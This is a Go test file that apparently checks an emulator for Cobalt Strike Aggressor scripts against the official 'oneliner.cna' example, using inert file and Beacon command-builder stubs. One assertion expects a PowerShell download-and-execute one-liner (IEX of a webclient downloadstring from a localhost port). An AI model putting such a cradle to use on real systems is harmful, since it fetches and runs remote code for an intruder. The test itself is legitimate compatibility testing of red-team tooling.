package opfor

import (
	"context"
	"fmt"
	"sync"
	"testing"
)

const (
	officialOnelinerPath         = "/fixture/payload script.ps1"
	officialOnelinerPayload      = "Write-Output \"OPFOR\"\r\n"
	officialOnelinerBuilderBytes = "OPFOR-BUILDER\x00BYTES"
	officialOnelinerPort         = int32(49152)
)

func TestOfficialOnelinerExampleBuildsAndTasksInertPayload(t *testing.T) {
	t.Parallel()

	files := newOfficialOnelinerFiles()
	objects := newOfficialOnelinerObjectHost()
	host := &officialBehaviorHost{}
	runtime, _, output := loadOfficialAdapterExample(
		t,
		"oneliner.cna",
		host,
		objects,
		WithFunction("openf", files.openf),
		WithFunction("readb", files.readb),
		WithFunction("closef", files.closef),
	)
	assertOfficialBehaviorCalls(t, host.takeCalls())

	if _, err := runtime.InvokeConsole(context.Background(), ConsoleInvocation{
		Kind: BindingAlias, Name: "oneliner",
		RawInput:  `oneliner "` + officialOnelinerPath + `"`,
		SessionID: String("beacon-23"),
	}); err != nil {
		t.Fatalf("InvokeConsole(oneliner): %v", err)
	}

	assertOfficialBehaviorCalls(t, files.takeCalls(),
		expectedOfficialCall("openf", officialOnelinerPath),
		expectedOfficialCall("readb", files.handle, int32(-1)),
		expectedOfficialCall("closef", files.handle),
	)

	objectCalls := objects.takeCalls()
	if len(objectCalls) != 6 {
		t.Fatalf("object call count = %d, want 6", len(objectCalls))
	}
	assertOfficialMouseObjectCall(t, objectCalls[0], ObjectInvoke, Null(), "common.CommonUtils", "randomPort")
	assertOfficialMouseObjectCall(t, objectCalls[1], ObjectConstruct, Null(), "beacon.CommandBuilder", "")
	assertOfficialMouseObjectCall(t, objectCalls[2], ObjectInvoke, objects.builder, "", "setCommand", Int(0x3b))
	assertOfficialMouseObjectCall(t, objectCalls[3], ObjectInvoke, objects.builder, "", "addShort", Int(officialOnelinerPort))
	assertOfficialMouseObjectCall(t, objectCalls[4], ObjectInvoke, objects.builder, "", "addString", String(officialOnelinerPayload))
	assertOfficialMouseObjectCall(t, objectCalls[5], ObjectInvoke, objects.builder, "", "build")
	if command, port, payload := objects.snapshotBuilder(); command != 0x3b || port != officialOnelinerPort || payload != officialOnelinerPayload {
		t.Fatalf("builder state = (command=%#x, port=%d, payload=%q)", command, port, payload)
	}

	hostCalls := host.takeCalls()
	if len(hostCalls) != 2 {
		t.Fatalf("host call count = %d, want 2; names = %v", len(hostCalls), officialBehaviorCallNames(hostCalls))
	}
	assertOfficialOnelinerTaskCall(t, hostCalls[0])
	wantOneLiner := "IEX ((new-object net.webclient).downloadstring('http://127.0.0.1:49152/'))"
	assertOfficialBehaviorCalls(t, hostCalls[1:],
		expectedOfficialCall("blog", "beacon-23", "Here's a one-liner: "+wantOneLiner),
	)
	if got := output.String(); got != "" {
		t.Fatalf("stdout = %q, want empty", got)
	}
}

func assertOfficialOnelinerTaskCall(t *testing.T, call officialBehaviorCall) {
	t.Helper()
	if call.name != "call" {
		t.Fatalf("first host call = %q, want call", call.name)
	}
	if len(call.values) != 4 {
		t.Fatalf("call argument count = %d, want 4; values = %s", len(call.values), ArrayValue(NewArray(call.values...)).Describe())
	}
	if call.values[0].Kind() != KindString || call.values[0].String() != "beacons.task" {
		t.Fatalf("call argument 0 = %s, want beacons.task", call.values[0].Describe())
	}
	if !call.values[1].IsNull() {
		t.Fatalf("call argument 1 = %s, want null", call.values[1].Describe())
	}
	if call.values[2].Kind() != KindString || call.values[2].String() != "beacon-23" {
		t.Fatalf("call argument 2 = %s, want beacon-23", call.values[2].Describe())
	}
	object, ok := call.values[3].Object()
	if !ok {
		t.Fatalf("call argument 3 = %s, want Java byte[]", call.values[3].Describe())
	}
	bytes, ok := object.(*portableJavaArray)
	if !ok || bytes.className() != "[B" || bytes.toSleepValue().String() != officialOnelinerBuilderBytes {
		t.Fatalf("call argument 3 = %T %v, want [B containing %q", object, object, officialOnelinerBuilderBytes)
	}
}

type officialOnelinerFile struct{}

func (*officialOnelinerFile) SleepDescribe() string { return "<inert-oneliner-file>" }

type officialOnelinerFiles struct {
	mu     sync.Mutex
	handle Value
	calls  []officialBehaviorCall
	closed bool
}

func newOfficialOnelinerFiles() *officialOnelinerFiles {
	return &officialOnelinerFiles{handle: ObjectValue(&officialOnelinerFile{})}
}

func (files *officialOnelinerFiles) openf(_ context.Context, invocation Invocation) (Value, error) {
	if values := invocation.Values(); len(values) != 1 || values[0].String() != officialOnelinerPath {
		return Null(), fmt.Errorf("inert openf arguments = %s", ArrayValue(NewArray(values...)).Describe())
	}
	files.record(invocation)
	return files.handle, nil
}

func (files *officialOnelinerFiles) readb(_ context.Context, invocation Invocation) (Value, error) {
	values := invocation.Values()
	if len(values) != 2 || !values[0].IdentityEqual(files.handle) || values[1].Int32() != -1 {
		return Null(), fmt.Errorf("inert readb arguments = %s", ArrayValue(NewArray(values...)).Describe())
	}
	files.mu.Lock()
	closed := files.closed
	files.mu.Unlock()
	if closed {
		return Null(), fmt.Errorf("inert readb called after closef")
	}
	files.record(invocation)
	return String(officialOnelinerPayload), nil
}

func (files *officialOnelinerFiles) closef(_ context.Context, invocation Invocation) (Value, error) {
	values := invocation.Values()
	if len(values) != 1 || !values[0].IdentityEqual(files.handle) {
		return Null(), fmt.Errorf("inert closef arguments = %s", ArrayValue(NewArray(values...)).Describe())
	}
	files.record(invocation)
	files.mu.Lock()
	files.closed = true
	files.mu.Unlock()
	return Null(), nil
}

func (files *officialOnelinerFiles) record(invocation Invocation) {
	values := invocation.Values()
	files.mu.Lock()
	files.calls = append(files.calls, officialBehaviorCall{
		name: invocation.Name, values: append([]Value(nil), values...),
	})
	files.mu.Unlock()
}

func (files *officialOnelinerFiles) takeCalls() []officialBehaviorCall {
	files.mu.Lock()
	defer files.mu.Unlock()
	calls := append([]officialBehaviorCall(nil), files.calls...)
	files.calls = nil
	return calls
}

type officialOnelinerBuilder struct{}

func (*officialOnelinerBuilder) SleepDescribe() string { return "<inert-command-builder>" }

type officialOnelinerObjectHost struct {
	mu      sync.Mutex
	builder Value
	calls   []ObjectInvocation
	command int32
	port    int32
	payload string
	step    int
}

func newOfficialOnelinerObjectHost() *officialOnelinerObjectHost {
	return &officialOnelinerObjectHost{builder: ObjectValue(&officialOnelinerBuilder{})}
}

func (host *officialOnelinerObjectHost) Object(_ context.Context, invocation ObjectInvocation) (Value, error) {
	host.mu.Lock()
	defer host.mu.Unlock()
	host.calls = append(host.calls, snapshotOfficialObjectInvocation(invocation))

	switch {
	case invocation.Op == ObjectInvoke && invocation.Class == "common.CommonUtils" && invocation.Message == "randomPort":
		if host.step != 0 || len(invocation.Arguments) != 0 {
			return Null(), fmt.Errorf("CommonUtils.randomPort called out of sequence")
		}
		host.step++
		return Int(officialOnelinerPort), nil
	case invocation.Op == ObjectConstruct && invocation.Class == "beacon.CommandBuilder":
		if host.step != 1 || len(invocation.Arguments) != 0 {
			return Null(), fmt.Errorf("CommandBuilder constructed out of sequence")
		}
		host.step++
		return host.builder, nil
	case invocation.Op == ObjectInvoke && invocation.Target.IdentityEqual(host.builder) && invocation.Message == "setCommand":
		if host.step != 2 || len(invocation.Arguments) != 1 {
			return Null(), fmt.Errorf("CommandBuilder.setCommand called out of sequence")
		}
		host.command = invocation.Arg(0).Int32()
		host.step++
		return Null(), nil
	case invocation.Op == ObjectInvoke && invocation.Target.IdentityEqual(host.builder) && invocation.Message == "addShort":
		if host.step != 3 || len(invocation.Arguments) != 1 {
			return Null(), fmt.Errorf("CommandBuilder.addShort called out of sequence")
		}
		host.port = invocation.Arg(0).Int32()
		host.step++
		return Null(), nil
	case invocation.Op == ObjectInvoke && invocation.Target.IdentityEqual(host.builder) && invocation.Message == "addString":
		if host.step != 4 || len(invocation.Arguments) != 1 {
			return Null(), fmt.Errorf("CommandBuilder.addString called out of sequence")
		}
		host.payload = invocation.Arg(0).String()
		host.step++
		return Null(), nil
	case invocation.Op == ObjectInvoke && invocation.Target.IdentityEqual(host.builder) && invocation.Message == "build":
		if host.step != 5 || len(invocation.Arguments) != 0 {
			return Null(), fmt.Errorf("CommandBuilder.build called out of sequence")
		}
		host.step++
		// The fixture deliberately returns opaque builder bytes. Encoding the
		// proprietary Beacon task format remains an ObjectHost responsibility.
		return String(officialOnelinerBuilderBytes), nil
	default:
		return Null(), &UnsupportedError{Operation: "test object operation", Name: invocation.Message}
	}
}

func (host *officialOnelinerObjectHost) takeCalls() []ObjectInvocation {
	host.mu.Lock()
	defer host.mu.Unlock()
	calls := append([]ObjectInvocation(nil), host.calls...)
	host.calls = nil
	return calls
}

func (host *officialOnelinerObjectHost) snapshotBuilder() (int32, int32, string) {
	host.mu.Lock()
	defer host.mu.Unlock()
	return host.command, host.port, host.payload
}

func snapshotOfficialObjectInvocation(invocation ObjectInvocation) ObjectInvocation {
	copyInvocation := invocation
	values := invocation.Values()
	copyInvocation.Arguments = make([]Argument, len(values))
	for index, value := range values {
		copyInvocation.Arguments[index] = Argument{Value: value}
	}
	return copyInvocation
}
